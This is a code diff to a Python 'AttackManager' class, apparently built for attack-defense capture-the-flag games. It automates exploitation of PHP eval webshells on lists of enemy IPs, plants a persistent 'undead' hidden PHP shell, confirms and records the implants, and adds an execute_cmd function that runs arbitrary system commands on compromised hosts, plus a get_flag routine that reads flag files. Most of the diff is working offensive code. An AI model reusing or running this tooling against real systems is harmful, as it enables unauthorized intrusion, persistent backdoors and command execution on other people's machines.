@@ -42,14 +42,20 @@ class AttackManager:
             try:
                 with open(self.config_file, 'r') as f:
                     self.enemy_config = json.load(f)
-            except: pass
+                print(f"DEBUG: Loaded attack config from {self.config_file} with {len(self.enemy_config.get('targets', {}))} targets")
+            except Exception as e:
+                print(f"ERROR: Failed to load attack config: {e}")
 
     def save_config(self):
         if self.config_file:
             try:
                 with open(self.config_file, 'w') as f:
                     json.dump(self.enemy_config, f, indent=4)
-            except: pass
+                print(f"DEBUG: Saved attack config to {self.config_file}")
+            except Exception as e:
+                print(f"ERROR: Failed to save attack config: {e}")
+        else:
+            print("ERROR: config_file is None, cannot save attack config")
 
     def set_enemy_config(self, template, excluded_ips_str):
         self.enemy_config['network_template'] = template
@@ -118,42 +124,55 @@ while (1) {{
             except Exception as e:
                 print(f"DEBUG: Verify failed for {url}: {e}")
         
-        if valid_uri: return valid_uri
+        if valid_uri: return valid_uri, port # Return tuple if remote verify succeeded (using passed port)
 
         # 4. Fallback: Verify via SSH (Localhost request)
         print(f"DEBUG: Remote verify failed. Assessing local verify via SSH (potential_uris={potential_uris})...")
-        for uri in potential_uris:
-            uri = uri.lstrip('/')
-            payload_key = password
-            payload_val = "echo 'VULN_CONFIRMED';"
-            
-            # --- Method A: curl ---
-            cmd_curl = f"curl -s -d \"{payload_key}={payload_val}\" http://127.0.0.1:{port}/{uri}"
-            print(f"DEBUG: Trying SSH curl: {cmd_curl}")
-            
-            try:
-                output = self.ssh.execute(local_ip, port, cmd_curl)
-                if output and 'VULN_CONFIRMED' in output:
-                    print(f"DEBUG: Verified local exploit via SSH (localhost curl): {uri}")
-                    valid_uri = uri
-                    break
-                else:
-                    print(f"DEBUG: curl failed, output: {output[:100] if output else 'None'}")
-                    # --- Method B: wget ---
-                    cmd_wget = f"wget -qO- --post-data \"{payload_key}={payload_val}\" http://127.0.0.1:{port}/{uri}"
-                    print(f"DEBUG: Trying SSH wget: {cmd_wget}")
-                    output = self.ssh.execute(local_ip, port, cmd_wget)
+        
+        # Try common web ports: 80, 8080. And the connection port just in case.
+        # Deduplicate and prioritize 80.
+        candidate_ports = []
+        for p in [80, 8080, port]:
+            if p not in candidate_ports: candidate_ports.append(p)
+
+        valid_port = None
+
+        for p_try in candidate_ports:
+            print(f"DEBUG: Trying local verification on port {p_try}...")
+            for uri in potential_uris:
+                uri = uri.lstrip('/')
+                payload_key = password
+                payload_val = "echo 'VULN_CONFIRMED';"
+                
+                # --- Method A: curl ---
+                cmd_curl = f"curl -s -d \"{payload_key}={payload_val}\" http://127.0.0.1:{p_try}/{uri}"
+                print(f"DEBUG: Trying SSH curl: {cmd_curl}")
+                
+                try:
+                    output = self.ssh.execute(local_ip, port, cmd_curl) # Always connect via SSH port
                     if output and 'VULN_CONFIRMED' in output:
-                        print(f"DEBUG: Verified local exploit via SSH (localhost wget): {uri}")
+                        print(f"DEBUG: Verified local exploit via SSH (localhost:{p_try} curl): {uri}")
                         valid_uri = uri
-                        break
+                        valid_port = p_try
+                        return valid_uri, valid_port # Return tuple
                     else:
-                        print(f"DEBUG: wget failed, output: {output[:100] if output else 'None'}")
+                        print(f"DEBUG: curl failed, output: {output[:100] if output else 'None'}")
+                        # --- Method B: wget ---
+                        cmd_wget = f"wget -qO- --post-data \"{payload_key}={payload_val}\" http://127.0.0.1:{p_try}/{uri}"
+                        print(f"DEBUG: Trying SSH wget: {cmd_wget}")
+                        output = self.ssh.execute(local_ip, port, cmd_wget)
+                        if output and 'VULN_CONFIRMED' in output:
+                            print(f"DEBUG: Verified local exploit via SSH (localhost:{p_try} wget): {uri}")
+                            valid_uri = uri
+                            valid_port = p_try
+                            return valid_uri, valid_port # Return tuple
+                        else:
+                            print(f"DEBUG: wget failed, output: {output[:100] if output else 'None'}")
 
-            except Exception as e:
-                print(f"DEBUG: SSH Local Verify error for {uri}: {e}")
+                except Exception as e:
+                    print(f"DEBUG: SSH Local Verify error for {uri} on port {p_try}: {e}")
 
-        return valid_uri
+        return None, None
 
     def start_counter_attack_campaign(self, source_ip, source_port, shell_path, password):
         """启动一波反制攻击"""
@@ -161,23 +180,22 @@ while (1) {{
             print("Attack cancelled: No enemy network template.")
             return
 
-        # 1. Verify locally first
-        valid_uri = self.verify_exploit_locally(source_ip, source_port, shell_path, password)
-        if not valid_uri:
+        # 1. Verify locally first (and get web port)
+        # Fix: Unpack the tuple returned by verify_exploit_locally
+        res = self.verify_exploit_locally(source_ip, source_port, shell_path, password)
+        if not res or not res[0]:
             print("Attack cancelled: Could not verify webshell locally.")
             return
         
+        valid_uri, valid_port = res
+        print(f"DEBUG: Local check passed. Target Port={valid_port}, URI={valid_uri}")
+
         # 2. Generate Enemy IPs
         enemy_ips = self._generate_enemy_ips(source_ip)
         
         # 3. Generate Payload
         payload_code = self.generate_undead_shell(password)
-        # We need to send this code via the webshell.
-        # Webshell: eval($_POST[password])
-        # Payload to send: fputs(fopen('undead.php','w'), '...code...'); include('undead.php');
-        # Or simply eval the whole undead code? eval code usually works for one-shot.
-        # But undead loop never returns. so we need to spawn it.
-        # Better: file_put_contents('u.php', ...); include('u.php');
+        # ... logic ...
         
         b64_code = base64.b64encode(payload_code.encode()).decode()
         # Exploitation Code: Write undead shell to disk, then spawn it detached
@@ -190,7 +208,8 @@ include($f);
         exploit_php = exploit_php.replace('\n', ' ')
 
         # 4. Launch asynchronously
-        threading.Thread(target=self._run_campaign, args=(enemy_ips, source_port, valid_uri, password, exploit_php)).start()
+        # Pass VALID_PORT instead of SOURCE_PORT
+        threading.Thread(target=self._run_campaign, args=(enemy_ips, valid_port, valid_uri, password, exploit_php)).start()
 
     def _generate_enemy_ips(self, my_ip):
         """
@@ -201,10 +220,15 @@ include($f);
         """
         template = self.enemy_config['network_template']
         if '{x}' not in template:
-            # Single IP mode
-            if template == my_ip: return []
-            if template in self.enemy_config['excluded_ips']: return []
-            return [template]
+            # Single IP mode OR Comma-separated list
+            raw_ips = [x.strip() for x in template.split(',')]
+            valid_ips = []
+            for ip in raw_ips:
+                if not ip: continue
+                if ip == my_ip: continue
+                if ip in self.enemy_config['excluded_ips']: continue
+                valid_ips.append(ip)
+            return valid_ips
         
         # Extract my octets? Not strictly needed if template is explicit.
         # But user wants "Last octet same".
@@ -254,7 +278,7 @@ include($f);
                 success = False # It shouldn't exit if loop runs
             except requests.exceptions.ReadTimeout:
                 # Timeout means script is running (looping)
-                result = "timeout(running)"
+                result = "Implanted (Active)"
                 success = True
             except Exception as e:
                 result = str(e)
@@ -264,23 +288,127 @@ include($f);
             target_info['status'] = status
             target_info['last_msg'] = result
             
+            # --- New: Print Result to Terminal ---
+            if success:
+                print(f"[ATTACK SUCCESS] {ip}:{port} - Payload delivered (timout confirmed).")
+            else:
+                print(f"[ATTACK FAILED] {ip}:{port} - {result}")
+            
             # Verify Implantation?
             # Try to connect to implanted shell: .index.php
+            # Note: The shell is written to the CURRENT working directory of the vulnerable script.
+            # So if uri is 'include/shell.php', the shell is at 'include/.index.php'.
             if success:
                 time.sleep(1)
-                verify_url = f"http://{ip}:{port}/{self.undead_filename}"
-                try:
-                    res = requests.get(verify_url, timeout=2)
-                    if res.status_code == 200:
-                        target_info['status'] = 'confirmed'
-                    else:
-                        target_info['status'] = 'uncertain'
-                except:
+                
+                # Determine directory of vulnerable script
+                base_dir = ""
+                if '/' in uri:
+                    base_dir = uri.rsplit('/', 1)[0] + '/'
+                
+                verify_uris = [
+                    f"{base_dir}{self.undead_filename}", # Same dir
+                    f"{self.undead_filename}" # Root dir (fallback)
+                ]
+                
+                verified = False
+                for v_uri in verify_uris:
+                    verify_url = f"http://{ip}:{port}/{v_uri}".replace('//', '/').replace('http:/', 'http://')
+                    try:
+                        res = requests.get(verify_url, timeout=2)
+                        if res.status_code == 200:
+                            target_info['status'] = 'confirmed'
+                            print(f"[ATTACK CONFIRMED] {ip}:{port} - Undead shell active at {verify_url}")
+                            verified = True
+                            break
+                    except:
+                        pass
+                
+                if not verified:
                     target_info['status'] = 'uncertain'
+                    # Print last tested URL just for info
+                    print(f"[ATTACK UNCERTAIN] {ip}:{port} - Verification failed (404/Timeout). Tested: {verify_uris}")
+            
+            # Save credentials if successful or uncertain
+            if success:
+                target_info['password'] = password
+                # We save the Undead Shell filename as the URI for future commands, NOT the vulnerable URI
+                # But we need to know the DIR.
+                # In verification, we found the valid URL. We should use THAT.
+                if verified:
+                     # e.g. http://ip:port/dvwa/include/.index.php
+                     # Extract URI path: /dvwa/include/.index.php
+                     from urllib.parse import urlparse
+                     parsed = urlparse(verify_url)
+                     target_info['shell_uri'] = parsed.path
+                else:
+                    # Fallback to guessing based on vulnerable URI
+                     base_dir = ""
+                     if '/' in uri:
+                        base_dir = uri.rsplit('/', 1)[0] + '/'
+                     target_info['shell_uri'] = f"{base_dir}{self.undead_filename}"
 
         except Exception as e:
             target_info['status'] = 'failed'
             target_info['last_msg'] = str(e)
+            print(f"[ATTACK FAILED] {ip}:{port} - Exception: {e}")
+        
+        # CRITICAL FIX: Update the main config dictionary
+        # target_info is a reference to the dict inside config if it existed,
+        # but if it was a default dict (get(..., {})), it's detached.
+        if ip not in self.enemy_config['targets']:
+             self.enemy_config['targets'][ip] = {}
+        
+        self.enemy_config['targets'][ip] = target_info
+        self.save_config()
+
+    def execute_cmd(self, ip, port, cmd):
+        """
+        Execute arbitrary command on target via undead shell.
+        Returns: {success: bool, output: str}
+        """
+        targets = self.enemy_config.get('targets', {})
+        target_info = targets.get(ip)
+        if not target_info:
+            return {'success': False, 'output': 'Target not found in attack list'}
+        
+        password = target_info.get('password')
+        shell_uri = target_info.get('shell_uri')
+        
+        if not password or not shell_uri:
+             return {'success': False, 'output': 'No shell credentials stored. Re-attack required.'}
+        
+        # Strip leading slash for url join if needed
+        shell_uri = shell_uri.lstrip('/')
+        url = f"http://{ip}:{port}/{shell_uri}"
+        
+        # Undead Shell Payload: <?php if(md5($_POST["pass"])=="md5(pass)"){ @eval($_POST[a]); } ?>
+        # We need to send:
+        # pass: <password>
+        # a: system('<cmd> 2>&1');
+        
+        # Escape command
+        # Ideally use base64 to avoid char issues
+        b64_cmd = base64.b64encode(cmd.encode()).decode()
+        php_payload = f"system(base64_decode('{b64_cmd}').' 2>&1');"
+        
+        try:
+            data = {
+                'pass': password,
+                'a': php_payload
+            }
+            res = requests.post(url, data=data, timeout=5)
+            if res.status_code == 200:
+                return {'success': True, 'output': res.text.strip()}
+            else:
+                return {'success': False, 'output': f"HTTP {res.status_code}"}
+        except Exception as e:
+            return {'success': False, 'output': str(e)}
+
+    def get_flag(self, ip, port):
+        # Try common flag locations
+        cmd = "cat /flag || cat /flag.txt || cat /var/www/html/flag.txt"
+        return self.execute_cmd(ip, port, cmd)
             
         self.enemy_config['targets'][ip] = target_info
         # Notify UI update? (websocket TODO)
